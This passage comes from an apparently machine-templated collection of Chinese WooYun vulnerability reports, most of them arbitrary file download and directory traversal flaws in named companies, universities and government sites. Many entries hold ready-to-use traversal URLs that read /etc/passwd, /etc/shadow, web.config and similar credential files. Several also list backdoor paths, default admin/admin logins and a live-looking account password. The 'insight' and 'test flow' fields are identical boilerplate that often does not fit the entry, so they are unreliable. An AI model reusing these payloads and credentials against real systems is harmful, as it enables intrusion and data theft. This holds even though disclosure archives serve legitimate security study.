2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载固件的时候，看到这样的后缀就知道要糟糕了http://pentax.com.cn/download.html?file=./http://pentax.com.cn/download.html?file=./../../../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-039858] 四川消防网多处漏洞合集
**厂商**: 四川消防网 | **年份**: 2013 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 其中有目录遍历，后门，源代码泄露，数据库路径泄露。时间问题，其他漏洞你们慢慢找吧。

**POC**: 源代码下载地址数据库路径目录遍历======================后门分割线==============================http://www.sc119.gov.cn/Inc/Const.asphttp://www.sc119.gov.cn/bbs/data/1.asphttp://www.sc119.gov.cn/bbs/Inc/cmd.asphttp://www.sc119.gov.cn/Inc/%E5%A4%8D%E4%BB%B6%20Const.asp-------------------------------------------------------

**绕过**: 直接利用

**修复**: 你们懂的。
---

---
### [wooyun-2012-08927] 西安交大任意文件下载
**厂商**: 西安交大 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 公派留学网存在任意文件下载漏洞http://gs.xjtu.edu.cn:8080/graduateschool/common/index.jsp它的URL参数:http://gs.xjtu.edu.cn:8080/graduateschool/common/download.jsp?path=网报说明.ppt这里有个十分敏感的参数path，下载的文件路径是由用户传入的。那么试试http://gs.xjtu.edu.cn:8080/graduateschool/common/download.jsp?path=../WEB-INF/web.xml没什么好东西接着试试http://gs.xjtu.edu.cn:8080/graduateschool/common/download.jsp?path=../WEB-INF/struts-config.xml（不方便一一列举）发现东西了，接着ht

**POC**: <img src="https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201206/28165003e91907595599ca57a00c64c93476c348.png" />又找到了东西不多。危险挺大

**绕过**: 直接利用

**修复**: 不知道
---

---
### [wooyun-2013-020006] 多家单位深信服设备敏感文件下载(补丁不及时),可成功控制设备 (1)
**厂商**: 多家政府相关单位 | **年份**: 2013 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 贵州省人大常委会https://221.13.4.44:4433/tmp/updateme/sinfor/ad/sys/sys_user.conf中国国际贸易促进委员会北京市分会https://chitec.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf中国建筑西南设计研究院有限公司https://cscecswi.com/tmp/updateme/sinfor/ad/sys/sys_user.conf灵石县人民政府https://lingshi.gov.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf湛江新闻网https://gdzjdaily.com.cn/tmp/updateme/sinfor/ad/sys/sys_user.conf中铝国际工程股份有限公司https://chalieco.com.cn/t

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 尽快打补丁！
---

---
### [wooyun-2014-074431] turbomail文件读取漏洞
**厂商**: turbomail.org | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Web.xml中有个j2me的servlet打开反编译出来的J2MEServlet.java，有以下的代码：else if (ACTION_TYPE.equals("ACTION_VIEW_EMAIL_ATTACHS")) {/* 348 */         String sessionId = dataInputStream.readUTF();/* 349 */         if (sessionId == null) {/* 350 */           return;/*     */         }/*     *//* 353 */         String mbtype = dataInputStream.readUTF();/* 354 */         String msgid = dataInputStream.readUTF();/* 355 *

**POC**: 同上

**绕过**: 直接利用

**修复**: 混淆代码过滤数据你懂的
---

---
### [wooyun-2012-04640] 中国联通平台管理系统目录遍历可以直接访问后台
**厂商**: 中国联通 | **年份**: 2012 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 服务器配置问题导致可以直接进入后台目录遍历

**POC**: 服务器配置问题导致可以直接进入后台目录遍历

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0102351] 驴妈妈旅游网敏感文件下载
**厂商**: 驴妈妈旅游网 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.lvmama.com/guide/zt.tarhttp://www.lvmama.com/others/yingcai.tar.gz

**POC**: 下载下来可看：

**绕过**: 直接利用

**修复**: 你懂的！
---

---
### [wooyun-2014-064190] 安财软件通用报销系统任意文件下载
**厂商**: 安财软件(acsoft.com.cn) | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安财软件网络报销系统 任意文件下载官方演示：V7.0http://demo.acsoft.com.cn/DownLoadPage.aspx?FileName=/web.configV7.5这个版本需要登录TC001:普通用户 TC002：首签领导 TC003:部门负责人 TC004：财务审核 TC005：财务审批 TC006：出纳、记账密码为空。http://demo.51able.com/DownLoadPage.aspx?FileName=/web.config关键词：网络报销系统 CA密码有些公司改了名字，可换其它关键词

**POC**: web.config下载案例：http://ac.qfkd.com.cn/DownLoadPage.aspx?FileName=/web.confighttp://baoxiao.miaozhen.com/DownLoadPage.aspx?FileName=/web.confighttp://oa.1919.cn:85/DownLoadPage.aspx?FileName=/web.confighttp://bx.315.com.cn:8000/DownLoadPage.aspx?FileName=/web.confighttp://bx.xiaotong.com.cn/DownLoadPa

**绕过**: 直接利用

**修复**: 限制下载目录
---

---
### [wooyun-2015-0113023] 国金证券查看UCstar所有用户聊天记录
**厂商**: gjzq.com.cn | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看了这个WooYun: 国金证券某漏洞导致任意文件下载想到 还有http://x.x.x.x/seatListSelect.jsp                  查看ucstar所有用户http://x.x.x.x/ucstarMessage-list-new.jsp  查看UCstar所有用户聊天记录http://x.x.x.x/webcall/messageNoteAdd.jsp存在http://mail.gjqh.com.cn:9090/ucstarMessage-list-new.jsp  查看UCstar所有用户聊天记录

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 来个邀请码吧
---

---
### [wooyun-2015-0165320] 北京市科协会学习平台任意文件下载及权限配置缺陷漏洞
**厂商**: 北京市科学技术协会 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标网站：http://**.**.**.**/发现采用WizBank系统。通过download.jsp的任意下载漏洞构造路径，同时配合权限设置缺陷即可下载到shadow文件。构造以下路径即可：http://**.**.**.**/cw/skin1/jsp/download.jsp?file=../../../../etc/shadow

**POC**: 通过download.jsp的任意下载漏洞构造路径，同时配合权限设置缺陷即可下载到shadow文件。构造以下路径即可：http://**.**.**.**/cw/skin1/jsp/download.jsp?file=../../../../etc/shadow

**绕过**: 直接利用

**修复**: 修改有漏洞的脚本，正确配置权限
---

---
### [wooyun-2015-0109842] 宝信某建站软件存在通用型任意文件下载漏洞
**厂商**: 上海宝信软件股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海宝信软件股份有限公司（简称“宝信软件”）系宝钢股份控股的软件企业，2001年4月上市，公司总部位于上海浦东张江高科技园区。宝信软件秉承“IT服务，提升信息价值”的经营理念，凭借30多年的经验和技术积累，全面提供具有自主知识产权的企业信息化解决方案、自动化系统集成及运行维护服务。产品与服务业绩遍及钢铁、交通、服务外包、采掘、有色、石化、装备制造（含造船）、金融、公共服务、资源、医药等多个行业。宝信软件累计已申请专利、软件著作权、技术秘密认定数百项，承担着国家发改委高新技术产业化示范项目、国家科技部863项目、国家工信部电子基金项目等诸多重大技术和产品项目。以工信部通信工程建设项目招标投标管理信息平台为例https://txzb.miit.gov.cn/EC/DM/ECDM0104.jsp?filePath=/etc/passwd&originalFilename=passwd

**POC**: 比较简单，我就直接给出案例地址，案例包含电子招标平台、以及iPowerCloud智慧能源云，包括但不限于以下http://www.nesteel.cn/cms_wz/EC/DM/ECDM0104.jsp?filePath=/etc/passwd&originalFilename=passwdhttps://txzb.miit.gov.cn/EC/DM/ECDM0104.jsp?filePath=/etc/passwd&originalFilename=passwdhttp://eps.shmetro.com/ieps/EC/DM/ECDM0104.jsp?filePath=/etc/passw

**绕过**: 直接利用

**修复**: 这个应该也是叫过滤吧
---

---
### [wooyun-2015-0144415] 运营商安全之中国电信DNS纠错系统弱口令登录
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 重庆电信DNS智能纠错系统**.**.**.**:8080/php.php   phpinfo泄漏**.**.**.**:8080/tp/login_ys.html**.**.**.**/dns/**.**.**.**:8080/phpdir/ 目录遍历弱口令登录**.**.**.**:8080/tp/admin888888这是什么鬼？163在黑名单？

**POC**: 重庆电信DNS智能纠错系统**.**.**.**:8080/php.php   phpinfo泄漏**.**.**.**:8080/tp/login_ys.html**.**.**.**/dns/**.**.**.**:8080/phpdir/ 目录遍历弱口令登录**.**.**.**:8080/tp/admin888888这是什么鬼？163在黑名单？

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0101864] 软航科技IE插件可导致本地磁盘目录被遍历
**厂商**: 重庆软航科技有限公司 | **年份**: 2015 | **类型**: 用户敏感数据泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户敏感数据泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户敏感数据泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 软航科技IE插件可导致本地磁盘目录被遍历，即使文件正在被别的进程读取加锁也可判断文件的存在状态OfficeControl.ocx中提供的功能函数IsLocalFileExists可被攻击者用来判断用户磁盘中是否存在某文件，从而实现目录遍历，判断系统或软件的特定版本文件存在与否实施进一步攻击。

**POC**: 以下视频演示了这一安全问题http://1drv.ms/1BOWHPT

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0146447] 中航安盟保险某系统存在任意文件下载漏洞
**厂商**: 中航安盟保险有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标地址：http://**.**.**.**:20022/iss_amwebins/ec/alltrustcard/cardRegister.jsp问题链接：http://**.**.**.**:20022/iss_amwebins/servlet/FileLookServlet?upfileurl=/etc/passwd

**POC**: http://**.**.**.**:20022/iss_amwebins/servlet/FileLookServlet?upfileurl=/etc/hostshttp://**.**.**.**:20022/iss_amwebins/servlet/FileLookServlet?upfileurl=%2Froot%2F.bash_history

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2011-02768] 迅雷邻居存在目录遍历漏洞
**厂商**: 迅雷 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 设置好限制条件和权限就好了。。
---

---
### [wooyun-2013-035860] 江蘇省某市政府交通機場等部門遍歷可上傳
**厂商**: 江蘇省某市政府 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 江蘇省常州市交通局江蘇省常州市質監局江蘇省常州市運輸管理處等多個政府網遍歷目錄，可上傳http://www.czjt.gov.cn:81http://hsj.czjt.gov.cnhttp://jgz.czjt.gov.cnhttp://zjc.czjt.gov.cnhttp://www.jslyjt.gov.cnhttp://xjc.czjt.gov.cnhttp://ajc.czjt.gov.cnhttp://zzc.czjt.gov.cnhttp://czjc.czjt.gov.cnhttp://ygc.czjt.gov.cnhttp://gkc.czjt.gov.cnhttp://hdc.czjt.gov.cnhttp://sgz.czjt.gov.cnhttp://glc.czjt.gov.cnhttp://cyjt.czjt.gov.cnhttp://zjz.czjt.gov.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: -_-!
---

---
### [wooyun-2015-0103261] 掌阅某分站任意文件下载一枚
**厂商**: zhangyue.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在http://360.zhangyue.com/zybook/u/p/book.php?key=4B4%27#id4 这个地方一不小心点了一本书，然后就发现直接下载了。查看源码发现下载方法在Js中：function download(bookName,book) {url = 'http://360.zhangyue.com/zybook/iReader/u/s/download/'+bookName+"?f=iReader&name=" + decodeURI(book) + "&360ext=apk";window.location.href = url;//window.location.href = "http://360.zhangyue.com/zybook/iReader/u/p/download.php?f=iReader&name=" + decodeURI(bookN

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0212967] 国华人寿保险股份有限公司某站存在任意文件读取漏洞
**厂商**: 95549.cn | **年份**: 2016 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://proposal.guohualife.com:8091/proposalproxy/plan/download/20150411100453.pdf?filename=../../../../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt

**POC**: http://proposal.guohualife.com:8091/proposalproxy/plan/download/20150411100453.pdf?filename=../../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-06447] 来伊份官网各种漏洞
**厂商**: 来伊份 | **年份**: 2012 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 各种注入，目录遍历，后台，FCKeditor编辑器。http://www.lyfen.com/?id=10328  注入http://www.lyfen.com/lib/ http://www.lyfen.com/demo/ 目录遍历http://www.lyfen.com/phpMyAdmin/  phpMyAdmin登陆http://www.lyfen.com/lib/FCKeditor/editor/filemanager/browser/default/browser.html FCKeditor编辑器

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 百度，Google，各种方法。
---

---
### [wooyun-2014-073139] 通付盾邮件服务器任意文件读取漏洞（泄露密码）
**厂商**: 通付盾 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这里获取到邮箱IPhttps://58.211.152.245/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00核心配置文件泄漏

**POC**: 这里获取到邮箱IPhttps://58.211.152.245/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00核心配置文件泄漏

**绕过**: 直接利用

**修复**: 呵
---

---
### [wooyun-2012-012873] 联想某站任意文件下载
**厂商**: 联想 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看到联想的回复，也上联想找找，还真找到一个洞，联想某站下载文件时没有判断文件。。

**POC**: 下载图片时没有判断是否图片：提交以下url:http://launcher.lenovo.com/launcher/portal.php?mod=mymaterial&url=source/module/member/member_getpasswd.php&wid=168可爱的源码出来了：

**绕过**: 直接利用

**修复**: 直接下载图不就完了。。
---

---
### [wooyun-2014-062971] 西南大学某站任意文件下载
**厂商**: 西南大学 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 路过看到的，试了下，漏洞页面：http://yxxf.swu.edu.cn/download.php?file=./../includes/config_inc.php哈 下下来了漏洞代码：function download($file_dir, $file_name) {//参数说明：//file_dir:文件所在目录//file_name:文件名$file_dir = chop($file_dir); //去掉路径中多余的空格//得出要下载的文件的路径if ($file_dir != '') {$file_path = $file_dir;if (substr($file_dir, strlen($file_dir) - 1, strlen($file_dir)) != '/')$file_path .= '/';$file_path .= $file_name;}else$file_

**POC**: 如上

**绕过**: 直接利用

**修复**: 用正则过滤下$file_name吧
---

---
### [wooyun-2012-010070] 赶集网分站任意文件读取
**厂商**: 赶集网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 读取数据库连接文件

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复，升级，你们懂得
---

---
### [wooyun-2014-079473] phpstat数据分析系统任意文件下载&&删除
**厂商**: phpstat | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ./download.php$fname = strval($_GET[fname]);//保存的文件名 可控 无需权限$fpath = strval($_GET[fpath]);//要下载的文件 可控 无需权限if(!file_exists($fpath))exit;$file=fopen($fpath,"r");Header("Content-type: application/octet-stream");Header("Accept-Ranges: bytes");Header("Accept-Length: ".filesize($fpath));Header("Content-Disposition: attachment; filename=" . $fname."");echo fread($file,filesize($fpath));//看吧,这就下载了fclose($

**POC**: http://localhost/download.php?fname=1.txt&fpath=./include.inc/config.inc.php

**绕过**: 直接利用

**修复**: 判断下载的文件吧
---

---
### [wooyun-2014-056649] 携手网文件下载SA信息泄露
**厂商**: 携手网任意文件下载 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://ins.xieshouwang.com.cn/Company/DownLoad?filename=1.txt&savename=..\..\web.config

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 文件过滤。
---

---
### [wooyun-2014-059438] 某企业建站系统cms任意文件下载漏洞(影响多个实例)
**厂商**: Polaris cms | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在该漏洞的cms是 Polaris cmsgoogle关键字：downfile.php?direct 就可以找到许多，有的找不到的 请看我下面提供的列表即可：）主要是当开启了下载模块：即download.php。对传入的参数没有进行很好的过滤。产生了任意文件下载。来看看实例1http://www.sigmarobot.com/开启了下载模块之后我们访问如下链接：http://www.sigmarobot.com/downfile.php?direct=../&file=downfile.php文件源码妥妥的，躺在了 我们的文件夹中呀。。这根本没有过滤啊！通过对文件系统的首页下载分析。得到数据库配置文件：utility.php好咯，既然在根目录，我们直接就down回来看看http://www.sigmarobot.com/downfile.php?direct=../&file=utili

**POC**: 好了，下面来一波：http://www.sigmarobot.com/downfile.php?direct=../&file=utility.phphttp://www.tan-star.com.tw/downfile.php?direct=../&file=utility.phphttp://www.injection.com.tw/downfile.php?direct=../&file=utility.php全部贴图有点累，就贴上面这些吧。下面这些也是可以下载的哦：www.chaowei.com.tw/downfile.php?direct=../&file=downfile.phpw

**绕过**: 直接利用

**修复**: 对传入参数进行有效性验证。
---

---
### [wooyun-2016-0167142] 圆通某核心运营系统弱口令到任意文件下载
**厂商**: 圆通 | **年份**: 2016 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://jingang.yto56.com.cn/exptrack/logout.action圆通账号：00019484密码：Yto456789首次登录要求绑定mac地址并要求改密码，这里已经绑定了我的mac地址且密码改了。。

**POC**: 各种运营数据任意文件下载http://jingang.yto56.com.cn/mdm_2/downloadAction.action?fileName=../../../../../../../../../../etc/passwd&realName=../../../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: Null
---

---
### [wooyun-2015-0127280] Suning某站点任意文件读取漏洞
**厂商**: 江苏苏宁易购电子商务有限公司 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 参数注入

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞站点：online.suning.com参数控制不严谨导致任意文件读取漏洞----------------------------------详细的挖掘过程：1）抓包过程中发现有个请求及相应如下：2）额？爆出路径，且提示/opt/webcall/customer/image/undefined 文件不存在，这里只要能支持../跳出当前目录，即可读取任意文件了3）直接修改参数 fileName=../../../../etc/passwd ，发送请求4）ok，读取成功。判断权限，非root5）测试就到这里吧。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-085721] 某CMS漏洞影响多个政府网站
**厂商**: cncert | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入, 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.yzsgaj.gov.cn 永州市公安局http://ll.yzsgaj.gov.cn	永州市公安局http://www.yzglj.com/   永州市公路局http://www.ninyuan.gov.cn/ 宁远县政府http://www.qy.gov.cn/ 祁阳政府网http://www.yzsgjj.gov.cn/ 永州市住房公积金管理中心http://www.dx.gov.cn/ 道县政府http://sjj.dx.gov.cn/ 道县审计局http://www.lst.gov.cn 冷水滩区政府http://www.cnll.gov.cn 零陵http://jsw.lanshan.gov.cn/ 蓝山县http://da.yzsgaj.gov.cn 东安县公安局http://www.lanshan.gov.cn 蓝山县http://www.axdjw.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 没你们懂。。。。。
---

---
### [wooyun-2015-0130154] 内蒙古大学分站问题打包
**厂商**: 内蒙古大学 | **年份**: 2015 | **类型**: 服务弱口令

**元思考**: 触发信号: 后台管理

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 内蒙古大学审计处网站后台弱口令http://ndsjc.imu.edu.cn/admini/login.php用户名admin密码admin内蒙古大学EMBA教育中心网站后台弱口令http://www.imuemba.com/emba_backstage/Login.asp用户名admin密码admin以上网站均可任意修改、发布网站信息。内蒙古大学国防生网站配置错误导致的目录遍历http://gfs.imu.edu.cn/Database/PowerEasy SiteWeaver CMS 6.8版默认数据库可下载http://gfs.imu.edu.cn/Database/SiteWeaver.mdb下载数据库是为了测试，测试完已将下载的数据库删除。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改密码 加强信息安全教育 提高网站管理维护人员安全意识
---

---
### [wooyun-2015-097832] 网康NS-ASG任意文件下载漏洞
**厂商**: 网康科技 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://xxx/commonplugin/Download.php?reqfile=文件名存在任意文件下载

**POC**: 路径结果

**绕过**: 直接利用

**修复**: 过滤？
---

---
### [wooyun-2013-027297] 某省人民防空办室整站源码下载
**厂商**: 某省人民防空办室 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hbrf.gov.cn/www.rarhttp://www.hbrf.gov.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删除压缩包
---

---
### [wooyun-2014-078883] 百度某分站任意文件读取
**厂商**: 百度 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在目录遍历漏洞

**POC**: GET /../../../../../../../../../../etc/passwd HTTP/1.1User-Agent: FiddlerHost: cdn.code.baidu.com

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-059331] 中国交通通信信息中心目录遍历
**厂商**: 中国交通通信信息中心 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: RT

**POC**: http://www.cttic.cn/db/

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-051189] 华汇人寿保险股份有限公司某页面任意文件下载
**厂商**: 华汇人寿保险股份有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件下载

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制访问
---

---
### [wooyun-2014-084185] 真旅网某逻辑订单信息泄露&文件下载&越权
**厂商**: 真旅网集团 | **年份**: 2014 | **类型**: 用户资料大量泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户资料大量泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户资料大量泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: title

**POC**: 哈，听说新厂商真旅网福利多！找了几个。一、后台逻辑漏洞导致用户订单信息泄露问题出在这里：http://b2b.tdxinfo.com/在此平台注册帐号登录后，然后再访问http://jdht.tdxinfo.com/这个域名，可以看到所有用户订单信息泄露。点击订单号可查看所有订单信息二、任意文件下载问题出在这里:http://b2b.tdxinfo.com/Buyer/SystemManage/DownLoad.aspx?filename=filename参数可控，这个漏洞本身是高危的！但是服务器有些限制，因为iis继承的并不是system权限，所以只能访问C盘user权限可读的文件，但是do

**绕过**: 直接利用

**修复**: 一、验证普通用户是否具有后台权限二、过滤文件下载三、验证用户权限
---

---
### [wooyun-2013-033592] 百姓网某分站任意文件读取漏洞
**厂商**: 百姓网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先发个，后面再来http://s.baixing.net/page/combine.php?files=/../index.php

**POC**: (见原文)

**绕过**: 直接利用

